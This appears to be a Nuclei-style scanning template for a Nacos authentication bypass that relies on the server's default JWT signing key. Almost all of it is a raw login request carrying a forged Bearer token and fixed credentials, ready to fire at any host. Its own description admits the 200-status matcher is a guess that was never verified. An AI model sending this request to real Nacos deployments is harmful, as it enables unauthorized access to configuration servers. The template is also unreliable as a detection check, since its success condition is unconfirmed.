id: poc-14ae4a70f4b9acd85888
info:
  name: Nacos默认key导致权限绕过登陆漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: unauth,2025
http:
- raw:
  - 'POST /nacos/v1/auth/users/login HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 28

    Accept: application/json, text/plain, */*

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

    Content-Type: application/x-www-form-urlencoded

    Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA3MDk1MzY0M30.XPfd1WnNHqQdu5-D734ishsizYCEbsQG7mVwdm4MyWg

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close


    username=nacos&password=1111'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
